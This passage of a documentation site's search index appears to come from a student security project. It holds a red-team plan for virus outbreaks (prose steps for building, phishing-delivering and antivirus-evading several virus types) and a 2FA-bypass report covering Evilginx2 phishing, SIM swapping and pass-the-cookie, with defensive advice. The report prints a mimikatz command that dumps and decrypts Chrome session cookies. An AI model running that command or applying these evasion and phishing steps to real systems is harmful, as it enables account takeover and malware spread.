the subsequent impact it can have on compromised systems.  ","version":"Next","tagName":"h3"},{"title":"2.2 Steps:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#22-steps","content":" Identify Target Systems: Conduct thorough reconnaissance to identify systems with vulnerable software. This involves scanning for outdated applications or operating systems that are susceptible to exploitation.Crafting the Payload: Utilize tools such as Metasploit or custom scripts to craft a file infector virus payload. This payload should be designed to infect executable files commonly used within the target environment.Delivery via Social Engineering: Employ social engineering tactics to deliver the infected file to target users. This could involve crafting convincing phishing emails or utilizing file-sharing platforms where users are likely to download and execute the infected file.Monitoring Antivirus Responses: Continuously monitor antivirus software responses to the infected file. Modify the virus if necessary to evade detection by antivirus programs, ensuring that it maintains its ability to spread and infect files undetected.Tracking Virus Spread: Monitor the spread of the virus within the target network by tracking file modifications and checksum changes. This helps gauge the effectiveness of the virus in infiltrating and spreading within the network.  ","version":"Next","tagName":"h3"},{"title":"2.3 Tools and Techniques:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#23-tools-and-techniques","content":" Metasploit: Utilize Metasploit for crafting and delivering the file infector virus payload. Metasploit provides a comprehensive framework for developing, testing, and executing exploits, making it an ideal tool for red team operations.Custom Virus Creation Scripts: Develop custom scripts tailored to the specific requirements of the red team exercise. These scripts can automate various aspects of virus creation and modification, enabling rapid adaptation to changing circumstances.Social Engineering Tactics: Employ social engineering techniques to deceive users into executing the infected file. This could include crafting convincing phishing emails or creating enticing file-sharing links that entice users to download and execute the malicious payload.Antivirus Evasion Techniques: Employ techniques to evade detection by antivirus software, such as code obfuscation, polymorphism, or encryption. Continuously monitor antivirus responses and modify the virus accordingly to maintain its ability to evade detection.Monitoring Tools: Utilize monitoring tools to track the spread of the virus within the target network. These tools can help identify infected files, monitor file modifications, and assess the overall impact of the virus on compromised systems.  ","version":"Next","tagName":"h3"},{"title":"3. Macro Virus:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#3-macro-virus","content":"   ","version":"Next","tagName":"h2"},{"title":"3.1 Objective:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#31-objective","content":" The aim of deploying a macro virus as part of a red team exercise is to demonstrate the effectiveness of such malware in compromising systems through infected documents, thereby highlighting the importance of security measures against macro-based attacks.  ","version":"Next","tagName":"h3"},{"title":"3.2 Steps:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#32-steps","content":" Crafting Malicious Documents: Utilize Microsoft Office or similar tools to craft malicious documents with embedded macros. These macros can be designed to execute malicious code upon opening the document, exploiting vulnerabilities in the application's macro functionality.Distribution via Phishing: Distribute the malicious documents via phishing emails or file-sharing platforms. Ensure that the emails or files contain enticing subject lines or content to increase the likelihood of users opening them.Encouraging Macro Execution: Employ social engineering tactics or deceptive prompts to encourage users to enable macros when opening the document. This may involve crafting convincing messages that persuade users to bypass security warnings and enable macros for purportedly legitimate reasons.Monitoring for Infections: Continuously monitor for successful infections across target systems. Track the spread of the macro virus and observe any subsequent system disruptions or data loss resulting from its malicious activities.  ","version":"Next","tagName":"h3"},{"title":"3.3 Tools and Techniques:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#33-tools-and-techniques","content":" Microsoft Office VBA Scripting: Utilize Visual Basic for Applications (VBA) scripting to create the malicious macros embedded within the documents. VBA provides a powerful scripting language that allows for the automation of tasks within Microsoft Office applications, including the execution of malicious code.Phishing Email Templates: Develop phishing email templates designed to lure recipients into opening the malicious documents. These templates should be carefully crafted to appear legitimate and persuasive, increasing the likelihood of successful infection.Document Encryption: Employ document encryption techniques to evade detection by antivirus software. Encrypting the malicious documents can help bypass static signature-based detection methods used by antivirus programs.  ","version":"Next","tagName":"h3"},{"title":"4. Boot Sector Virus​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#4-boot-sector-virus","content":"   ","version":"Next","tagName":"h2"},{"title":"4.1 Objective:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#41-objective","content":" The objective of deploying a boot sector virus as part of a red team exercise is to illustrate the significant impact such malware can have on system boot-up processes and data integrity. By demonstrating the capabilities of a boot sector virus, the red team aims to emphasize the importance of safeguarding against such threats and implementing robust security measures to protect critical system components.  ","version":"Next","tagName":"h3"},{"title":"4.2 Steps:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#42-steps","content":" Developing the Boot Sector Virus Payload: To initiate the exercise, the red team must first develop a boot sector virus payload tailored to target specific operating systems or storage devices. This entails thorough research and understanding of the target environment's architecture and boot process. The virus payload should be designed to infect the boot sector of the target system discreetly, ensuring persistence and evasion of detection mechanisms.Injecting the Virus into the Boot Sector: The next step involves injecting the developed boot sector virus into the boot sector of a target system. This can be achieved using various exploitation techniques, such as leveraging vulnerabilities in the boot process or through physical access to the system. For remote deployment, exploiting vulnerabilities in network boot protocols or remote management interfaces may be necessary.Monitoring for Anomalies during System Boot-Up: With the virus injected into the boot sector, the red team must carefully monitor the target system for anomalies during the boot-up process. Anomalies may include errors, delays, or unexpected behavior indicative of the virus's interference with the boot sequence. Monitoring tools specifically designed to track system boot-up processes can aid in detecting such anomalies.Demonstrating Data Loss or Corruption: Once the virus has successfully infected the boot sector, the red team can demonstrate the consequences of its presence on the target system's data integrity. This may involve showcasing data loss or corruption resulting from the virus's interference with disk partitions or critical system files. By simulating real-world scenarios of data loss or corruption, the red team highlights the severity of the threat posed by boot sector viruses.  ","version":"Next","tagName":"h3"},{"title":"4.3 Tools and Techniques:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#43-tools-and-techniques","content":" Boot Sector Manipulation Tools: Utilize specialized tools designed for manipulating boot sectors to develop and inject the boot sector virus payload into the target system. These tools may include sector editors, boot sector creation utilities, or custom scripts tailored to the specific requirements of the red team exercise.Physical Access Exploitation: In scenarios where physical access to the target system is feasible, exploit vulnerabilities in the system's physical security measures to gain access and inject the virus into the boot sector. This may involve techniques such as booting from external media or accessing the system's hardware components directly.System Boot-Up Monitoring Tools: Employ monitoring tools capable of tracking system boot-up processes to detect anomalies indicative of boot sector virus activity. These tools can provide real-time alerts and notifications, allowing the red team to promptly respond to any detected threats and assess the impact on the target system.  ","version":"Next","tagName":"h3"},{"title":"5. Polymorphic Virus:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#5-polymorphic-virus","content":"   ","version":"Next","tagName":"h2"},{"title":"5.1 Objective:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#51-objective","content":" The primary objective of deploying a polymorphic virus as part of a red team exercise is to highlight the challenges faced by antivirus software in detecting and mitigating such sophisticated malware. By demonstrating the capabilities of a polymorphic virus, the red team aims to underscore the importance of employing advanced detection and defense mechanisms to combat evolving cyber threats.  ","version":"Next","tagName":"h3"},{"title":"5.2 Steps:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#52-steps","content":" Creating a Polymorphic Virus: The initial step involves creating a polymorphic virus capable of altering its code and signatures with each infection. This requires the use of specialized polymorphic virus generation tools and techniques that enable dynamic code obfuscation and mutation. The virus should be designed to generate unique variants with each infection, making it difficult for antivirus software to detect using traditional signature-based methods.Deploying the Virus Across Target Systems: Once the polymorphic virus is created, the red team deploys it across target systems to assess its effectiveness in evading detection by antivirus software. Care should be taken to ensure varied payloads and infection vectors are used to further obfuscate the virus's presence and evade signature-based detection. This may involve leveraging different delivery mechanisms such as email attachments, malicious websites, or removable media.Monitoring Antivirus Responses and Adapting the Virus Code: Continuously monitor antivirus responses to the deployed polymorphic virus across target systems. Analyze how antivirus software detects and responds to the virus's presence and adapt the virus code accordingly to bypass detection mechanisms. This may involve modifying the virus's code structure, encryption techniques, or mutation algorithms to evade detection while maintaining its malicious functionality.Demonstrating Impact on Infected Systems: To showcase the effectiveness of the polymorphic virus, demonstrate its ability to cause random crashes or unusual behavior across infected systems. This can include scenarios where the virus disrupts system processes, corrupts files, or compromises system stability. By highlighting the real-world impact of the virus on infected systems, the red team emphasizes the importance of proactive threat detection and mitigation strategies.  ","version":"Next","tagName":"h3"},{"title":"5.3 Tools and Techniques:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#53-tools-and-techniques","content":" Polymorphic Virus Generation Tools: Utilize specialized polymorphic virus generation tools capable of generating unique variants with each infection. These tools employ advanced code obfuscation techniques and mutation algorithms to evade detection by antivirus software.Dynamic Code Obfuscation Techniques: Implement dynamic code obfuscation techniques to continuously modify the virus's code and signatures with each infection. This may include encryption, code permutation, and instruction reordering to obfuscate the virus's behavior and evade static analysis by antivirus software.Continuous Monitoring for Antivirus Responses: Employ continuous monitoring tools to track antivirus responses to the deployed polymorphic virus across target systems. This allows the red team to assess the effectiveness of the virus in evading detection and adapt its code accordingly to bypass detection mechanisms.  ","version":"Next","tagName":"h3"},{"title":"6. Resident Virus:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#6-resident-virus","content":"   ","version":"Next","tagName":"h2"},{"title":"6.1 Objective:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#61-objective","content":" The objective of deploying a resident virus as part of a red team exercise is to showcase the persistence and stealth of such malware within system memory. By demonstrating the capabilities of a resident virus, the red team aims to emphasize the importance of implementing robust security measures to detect and mitigate memory-resident threats effectively.  ","version":"Next","tagName":"h3"},{"title":"6.2 Steps:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#62-steps","content":" Developing a Resident Virus: The first step involves developing a resident virus capable of embedding itself in system memory and evading detection by antivirus software. This requires utilizing specialized resident virus creation tools and techniques that enable the virus to inject its code into system processes or system memory regions, ensuring persistence even after system restarts.Infecting Target Systems: Once the resident virus is developed, the red team infects target systems to demonstrate its sustained activity despite system restarts. Care should be taken to infect multiple systems across the target environment to assess the virus's impact and propagation capabilities effectively.Monitoring for Unusual Behavior: Continuously monitor infected systems for performance degradation or unusual behavior indicative of resident virus activity. This may include increased CPU or memory usage, unexpected system crashes, or unauthorized network communication initiated by the virus. Monitoring tools capable of detecting anomalous behavior in real-time should be employed to identify and respond to resident virus activity promptly.Evading Antivirus Scans: To evade detection by antivirus scans, the resident virus employs memory-scanning evasion techniques that allow it to hide its presence within system memory. This may involve encrypting or obfuscating its code, using stealthy injection techniques, or manipulating system memory structures to evade detection by traditional antivirus software.  ","version":"Next","tagName":"h3"},{"title":"6.3 Tools and Techniques:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#63-tools-and-techniques","content":" Resident Virus Creation Tools: Utilize specialized resident virus creation tools capable of developing malware designed to embed itself in system memory. These tools often provide features for code injection, stealth techniques, and persistence mechanisms necessary for creating effective resident viruses.Memory Injection Techniques: Employ memory injection techniques to inject the resident virus's code into system processes or memory regions. This ensures the virus remains active and persistent within system memory, allowing it to evade detection by traditional file-based antivirus scans.Memory-Scanning Evasion Strategies: Implement memory-scanning evasion strategies to evade detection by antivirus software. This may include encrypting or obfuscating the virus's code to make it difficult for antivirus scanners to detect, or utilizing stealthy injection techniques that bypass signature-based detection methods.  ","version":"Next","tagName":"h3"},{"title":"7. Multipartite Virus :​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#7-multipartite-virus-","content":"   ","version":"Next","tagName":"h2"},{"title":"7.1 Objective:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#71-objective","content":" The objective of deploying a multipartite virus as part of a red team exercise is to showcase the combined effects of boot sector and file infector viruses, maximizing impact and spread within the target environment. By demonstrating the capabilities of a multipartite virus, the red team aims to underscore the importance of implementing comprehensive security measures to defend against complex, multi-vector cyber threats.  ","version":"Next","tagName":"h3"},{"title":"7.2 Steps:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#72-steps","content":" Developing a Multipartite Virus: The first step involves developing a multipartite virus capable of infecting both executable files and boot sectors. This requires utilizing specialized multipartite virus creation tools and techniques that enable the virus to spread across multiple infection vectors while maintaining its ability to infect critical boot sectors.Distributing the Virus Payload: Once the multipartite virus is developed, the red team distributes the virus payload through various vectors, including email attachments, compromised websites, and removable media. Care should be taken to diversify distribution channels to maximize the virus's reach and propagation potential across the target environment.Monitoring for Infections and Tracking Impact: Continuously monitor for infections across the target environment and track the virus's impact on both files and system boot processes. Utilize network traffic monitoring tools to detect and analyze virus propagation patterns, identifying infected systems and assessing the extent of the virus's spread.Demonstrating Effects of the Multipartite Virus: To showcase the combined effects of the multipartite virus, demonstrate the resulting data loss, system instability, and network propagation caused by the virus. This may include scenarios where infected files become corrupted, system boot processes are disrupted, and the virus spreads rapidly across interconnected systems within the network.  ","version":"Next","tagName":"h3"},{"title":"7.3 Tools and Techniques:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#73-tools-and-techniques","content":" Multipartite Virus Creation Tools: Utilize specialized multipartite virus creation tools capable of developing malware designed to infect both executable files and boot sectors. These tools often provide features for generating complex infection chains and spreading across multiple vectors.Multiple Infection Vector Exploitation: Exploit multiple infection vectors, including email attachments, compromised websites, and removable media, to distribute the multipartite virus payload. This ensures broad coverage and maximizes the virus's propagation potential within the target environment.Network Traffic Monitoring Tools: Employ network traffic monitoring tools to detect and analyze virus propagation patterns across the target environment. These tools provide visibility into network communications and can help identify infected systems, track the virus's spread, and assess its impact on network infrastructure.  ","version":"Next","tagName":"h3"},{"title":"8. Network Virus :​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#8-network-virus-","content":"   ","version":"Next","tagName":"h2"},{"title":"8.1 Objective:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#81-objective","content":" The primary objective of deploying a network virus as part of a red team exercise is to highlight the risks associated with network-based virus propagation and the exploitation of network vulnerabilities. By demonstrating the capabilities of a network virus, the red team aims to underscore the importance of implementing robust network security measures to defend against such threats effectively.  ","version":"Next","tagName":"h3"},{"title":"8.2 Steps:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#82-steps","content":" Identifying Target Networks with Vulnerabilities: The initial step involves identifying target networks with known vulnerabilities in network protocols or services. This requires conducting comprehensive network scans using tools such as Nmap to identify open ports, services running on target systems, and potential vulnerabilities that could be exploited for virus propagation.Developing a Network Virus Payload: Once vulnerabilities are identified, the red team develops a network virus payload capable of exploiting these vulnerabilities for propagation. This involves leveraging exploit development frameworks such as Metasploit to develop exploits targeting specific vulnerabilities in network protocols or services commonly used within the target environment.Deploying the Virus within the Target Network: With the network virus payload developed, the red team deploys the virus within the target network using various delivery methods. This may include exploiting network shares, phishing emails containing malicious attachments, or leveraging compromised systems as launch points for further propagation.Monitoring for Virus Spread through Network Connections: Continuously monitor the target network for signs of virus spread through network connections. This involves analyzing network traffic, monitoring network logs, and identifying anomalous behavior indicative of virus propagation. Network intrusion detection systems (IDS) and intrusion prevention systems (IPS) can aid in detecting and mitigating virus propagation attempts.Demonstrating Increased Network Traffic and Disruptions: To showcase the impact of the network virus, demonstrate increased network traffic and disruptions caused by its propagation. This may include scenarios where infected systems experience network slowdowns, service disruptions, or unauthorized network connections initiated by the virus. By simulating real-world network-based attacks, the red team highlights the potential risks associated with virus propagation within the target environment.Exploiting Compromised Systems for Further Access or Data Exfiltration: Exploit compromised systems within the target network for further access or data exfiltration. Once the virus has successfully propagated within the network, leverage compromised systems to escalate privileges, pivot to other network segments, or exfiltrate sensitive data for reconnaissance or malicious purposes.  ","version":"Next","tagName":"h3"},{"title":"8.3 Tools and Techniques:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#83-tools-and-techniques","content":" Network Scanning Tools (e.g., Nmap): Utilize network scanning tools such as Nmap to identify target networks and assess vulnerabilities in network protocols or services.Exploit Development Frameworks (e.g., Metasploit): Leverage exploit development frameworks like Metasploit to develop exploits targeting identified vulnerabilities for virus propagation within the target network.Payload Delivery via Network Shares or Phishing Emails: Deliver the network virus payload via network shares, phishing emails containing malicious attachments, or other vectors to initiate virus propagation within the target network  ","version":"Next","tagName":"h3"},{"title":"9. Stealth Virus :​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#9-stealth-virus-","content":"   ","version":"Next","tagName":"h2"},{"title":"9.1 Objective:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#91-objective","content":" The primary objective of deploying a stealth virus as part of a red team exercise is to test the effectiveness of such malware in evading detection and carrying out covert operations. By the capabilities of a stealth virus, the red team aims to highlight the challenges faced by traditional security measures in detecting and mitigating advanced threats.  ","version":"Next","tagName":"h3"},{"title":"9.2 Steps:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#92-steps","content":" Developing a Stealth Virus: The initial step involves developing a stealth virus capable of hiding its presence and operations from antivirus software and system administrators. This requires utilizing specialized stealth virus development frameworks and techniques that enable the virus to remain undetected by traditional security measures.Deploying the Virus across Target Systems: Once the stealth virus is developed, the red team deploys it across target systems while ensuring it remains undetected by traditional security measures. This may involve leveraging various infection vectors such as phishing emails, compromised websites, or removable media to initiate virus propagation within the target environment.Monitoring for Anomalies in System Behavior: Continuously monitor target systems for anomalies in system behavior, network traffic, and file properties indicative of stealth virus activity. This involves analyzing system logs, network traffic patterns, and file attributes to detect any suspicious behavior associated with the stealth virus.Demonstrating Covert Operations: To showcase the effectiveness of the stealth virus, demonstrate unauthorized access, data manipulation, or exfiltration carried out by the virus without raising suspicion. This may include scenarios where the virus stealthily collects sensitive information, manipulates files or system configurations, or exfiltrates data to external servers without alerting system administrators.Evading Detection and Removal Attempts: Evade detection and removal attempts by antivirus software through continuous adaptation and evasion techniques. This involves dynamically modifying the virus's code, employing encryption and obfuscation techniques, and evading signature-based detection methods used by antivirus software to detect and remove the stealth virus.  ","version":"Next","tagName":"h3"},{"title":"9.3 Tools and Techniques:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#93-tools-and-techniques","content":" Stealth Virus Development Frameworks: Utilize specialized stealth virus development frameworks capable of generating malware designed to evade detection by traditional security measures. These frameworks provide features for code obfuscation, encryption, and stealthy behavior to hide the virus's presence and operations.Encryption and Obfuscation Techniques: Employ encryption and obfuscation techniques to hide the stealth virus's code and evade detection by antivirus software. This may include encrypting the virus's payload, obfuscating code structures, and dynamically modifying the virus's behavior to avoid detection by signature-based detection methods.Continuous Monitoring for Suspicious Activities: Continuously monitor target systems for suspicious activities associated with the stealth virus. This involves analyzing system logs, network traffic patterns, and file properties to detect any anomalies indicative of virus activity and respond promptly to mitigate the threat.  ","version":"Next","tagName":"h3"},{"title":"Conclusion:​","type":1,"pageTitle":"Virus Outbreak Red Team Usecase","url":"/redback-documentation/docs/cybersecurity/RED TEAM/usecases/Virus Outbreak Incident Response Usecase#conclusion","content":" As we conclude our exploration of virus outbreak scenarios, it becomes evident that proactive defense measures are paramount in safeguarding against cyber threats. Through meticulous planning, rigorous testing, and continuous adaptation, organizations can fortify their defenses and mitigate the risks posed by virus outbreaks. By leveraging the insights gained from these red team exercises, we empower organizations to strengthen their cybersecurity posture and navigate the ever-changing threat landscape with confidence and resilience. Together, we can forge a path towards a safer and more secure digital future. ","version":"Next","tagName":"h2"},{"title":"Two Factor Authentication Bypass","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/research/2fa-bypass","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"Two Factor Authentication Bypass","url":"/redback-documentation/docs/cybersecurity/research/2fa-bypass#introduction","content":" The purpose of the document is to demonstrate the progress of two-factor authentication for Redback Operations from the previous trimesters. It consists of demonstrating vulnerability testing with evidence, on ways to bypass the two-factor authentications. Moreover, this document compiles all the evidence and research on vulnerabilities to give the next trimester students detailed implications of the projects and further advice on how to improve the two-factor authentication process. My role was to gather all the relevant documents and deliverables from the previous trimester and work on the progress to test the two-factor authentication find vulnerabilities and create a detailed document showcasing the vulnerabilities and ways to improve these in the next trimester. This handover document will consist of:  ","version":"Next","tagName":"h2"},{"title":"What is 2FA?​","type":1,"pageTitle":"Two Factor Authentication Bypass","url":"/redback-documentation/docs/cybersecurity/research/2fa-bypass#what-is-2fa","content":" Redback operations have decided to implement 2FA two-factor authentication as an additional layer of security to ensure that only the users who are entitled to their accounts can access them. Traditional authentication relies on single-factor authentication, however, 2FA adds an extra step of security to the login process by requiring a second authentication method to verify the authentication. The common types of 2FA include:  SMS or Email Codes Authentication apps Hardware Tokens Biometric Authentication Push notifications QR code  Each has its advantages and disadvantages. This document will discuss ways that 2FA can be bypassed and the vulnerabilities that need to be resolved for the next trimester.  ","version":"Next","tagName":"h2"},{"title":"Bypassing two-factor authentication​","type":1,"pageTitle":"Two Factor Authentication Bypass","url":"/redback-documentation/docs/cybersecurity/research/2fa-bypass#bypassing-two-factor-authentication","content":" ","version":"Next","tagName":"h2"},{"title":"Man in the middle attack (MitM) using Evilginx2​","type":1,"pageTitle":"Two Factor Authentication Bypass","url":"/redback-documentation/docs/cybersecurity/research/2fa-bypass#man-in-the-middle-attack-mitm-using-evilginx2","content":" Most phishing techniques are used by attackers who clone the login interface page and host it on their web server to gain access to the credentials. However, that can't always give the attackers access to the 2FA access code. Evilginx2 is a phishing tool that performs MitM attacks against websites that use two- factor authentication. It acts as a proxy connecting to 2FA-protected sites and acting as a passthrough from the victim -&gt; server as shown in the illustration below:    Evilginx2 acts as a proxy which means the user will see the contents of the site as exactly as they would when they visit the actual site. So the victim will see the login page for redback operations just as it would normally be. Attackers generate a phishing link and on successful sign-in from the victim the link will redirect the victim. The victim can receive this link via any available communication such as email, messenger, etc. The victim clicks on the link and will be presented with the Evilginx proxied sign-in page. After the victim enters the credentials to sign in, they will be redirected to the URL specified by the rc parameter. The rd cookie is saved for the domain in the victim's browser. From now on, if the cookie is present, the victim will be redirected to rc URl, when the phishing link is re-opened. Ultimately, attackers now have the victims' email and password, as well as session cookies that now can be imported into the attackers' browser to gain full access to the logged-in session, bypassing any two-factor authentication enabled on the victims' account.    Evilginx2 can configure the files named ‘phishlets’ that are plain text rulesets in YAML format. These files direct which subdomains are needed to proxy a specific site, which cookies to capture, and which page to redirect the victim and capture their credentials. In the image above we can see Evilgenx2 has captured the user credentials and all the tokens are intercepted. This lets the attack hijack the user session using the authorized session tokens, using a cookie manager, and logging in without entering the username and password.  ","version":"Next","tagName":"h3"},{"title":"Monitor URL​","type":1,"pageTitle":"Two Factor Authentication Bypass","url":"/redback-documentation/docs/cybersecurity/research/2fa-bypass#monitor-url","content":" The users need to be aware of the URL of the domain they are attempting to sign into. Redback Operations needs to train the staff and users to avoid damage. Users need to be trained on social engineering attacks and be careful what links they are clicking on.  ","version":"Next","tagName":"h3"},{"title":"Universal 2nd Factor​","type":1,"pageTitle":"Two Factor Authentication Bypass","url":"/redback-documentation/docs/cybersecurity/research/2fa-bypass#universal-2nd-factor","content":" Universal 2 factors are hardware keys that have a clear security mechanism inbuilt where it will not issue a 2FA token if the domain does not match the legit domain  ","version":"Next","tagName":"h3"},{"title":"Pass the Cookie​","type":1,"pageTitle":"Two Factor Authentication Bypass","url":"/redback-documentation/docs/cybersecurity/research/2fa-bypass#pass-the-cookie","content":" User authentication information is stored by cookies in the web application, which lets the user stay signed in instead of logging in multiple times. Pass the cookie works in a way once the user has already logged on by verifying the 2FA a browser cookie is created and stored for the web session. The attack can then extract the right browser cookies, they can then access as another user in a separate web browser session on another system using the cookies to bypass the authentication via MFA.    Name:Melvin Manoj ID:219187067 Universal 2 factors are hardware keys that have a clear security mechanism inbuilt where it will not issue a 2FA token if the domain does not match the legit domain. Pass the Cookie User authentication information is stored by cookies in the web application, which lets the user stay signed in instead of logging in multiple times. Pass the cookie works in a way once the user has already logged on by verifying the 2FA a browser cookie is created and stored for the web session. The attack can then extract the right browser cookies, they can then access as another user in a separate web browser session on another system using the cookies to bypass the authentication via MFA.  The attacker first extracts the cookies using this command:  mimikatz.exe privilege::debug log &quot;dpapi::chrome /in:%localappdata%googlechromeUSERDA~1defaultcookies /unprotect&quot; exit   The attacker can then use the stolen cookies to inspect the stolen session by opening Chrome on another server and using the ‘inspect’ interface to insert a cookie. The attacker can navigate to pass the cookies to hijack the session and refresh the page. The attack then has access to the user account using the cookies that have already authenticated 2FA. The attack now can use the stolen web session to impersonate the victim user to access unauthorized data.  ","version":"Next","tagName":"h3"},{"title":"Using HTTPS​","type":1,"pageTitle":"Two Factor Authentication Bypass","url":"/redback-documentation/docs/cybersecurity/research/2fa-bypass#using-https","content":" Encryption data transmission between user and browser using HTTPS can prevent attackers from intercepting sensitive information such as session cookies.  ","version":"Next","tagName":"h3"},{"title":"Secure Cookies​","type":1,"pageTitle":"Two Factor Authentication Bypass","url":"/redback-documentation/docs/cybersecurity/research/2fa-bypass#secure-cookies","content":" Secure Flag and HttpOnly flag ensure that the cookie is sent over HTTPS only and prevents JavaScript from accessing the cookie. Ultimately making it difficult for the attacker to steal the session cookie.  ","version":"Next","tagName":"h3"},{"title":"SMS Based Man in the Middle (MitM)​","type":1,"pageTitle":"Two Factor Authentication Bypass","url":"/redback-documentation/docs/cybersecurity/research/2fa-bypass#sms-based-man-in-the-middle-mitm","content":" Attacks use an SMS MITM attack to gain unauthorized access to alter SMS messages between two parties. Attacks can use social engineering to trick phone companies into swapping SIMs then they can gain access to the SMS-based two-factor authentication for the victim as they are receiving all the SMS messages to the attack's phone without the victim realizing it. This attack takes control of the phone number and now has access to the 2FA code that is sent. This attack can bypass the OTP one-time password sent to the user by SMS as the attacker has access to the phone number. Moreover, once the attacker can reroute the messages they can also gain access to other accounts that phone number.  ","version":"Next","tagName":"h3"},{"title":"Using Additional Authentication​","type":1,"pageTitle":"Two Factor Authentication Bypass","url":"/redback-documentation/docs/cybersecurity/research/2fa-bypass#using-additional-authentication","content":" Using app-based 2FA or hardware tokens rather than relying on the SMS-based 2FA will create additional security for the user.  ","version":"Next","tagName":"h3"},{"title":"Attack on Hard and Soft Tokens​","type":1,"pageTitle":"Two Factor Authentication Bypass","url":"/redback-documentation/docs/cybersecurity/research/2fa-bypass#attack-on-hard-and-soft-tokens","content":" While software tokens like Google Authenticator or RSA’s SecureID Authenticate are generally considered secure, the nature of BYOD means organizations still have to worry about malware on the phones themselves. They generate a TOTP-based one-time password, the user has to download another app such as Microsoft Authenticator, Google Authenticator, etc, which produces a TOTP that the user has to enter to gain access after providing their credentials. These codes usually generate codes that are 6 digits long and refresh after every 30 seconds. This method is more secure than all the options discussed above, however, if the attacker gains access to the phone, they have access to the code and then can gain access to the account. Moreover, if the victim clicks on the phishing link that mimics the real website, the victim will provide the login and TOTP on the fake website which then the attacker can use on the real website to gain access to your account.  ","version":"Next","tagName":"h3"},{"title":"Defense​","type":1,"pageTitle":"Two Factor Authentication Bypass","url":"/redback-documentation/docs/cybersecurity/research/2fa-bypass#defense","content":" Avoid phishing links that are sent by email or SMS. The user needs to be aware of the risks of data breaches and needs to be informed about what the real website links should look like.  Moreover, we can use TOTP codes that are longer than 6 digits to help against brute force attacks, as the longer code will not give the attacks enough time to use brute force attack, as the password will reset in 30 seconds.  ","version":"Next","tagName":"h3"},{"title":"Conclusion​","type":1,"pageTitle":"Two Factor Authentication 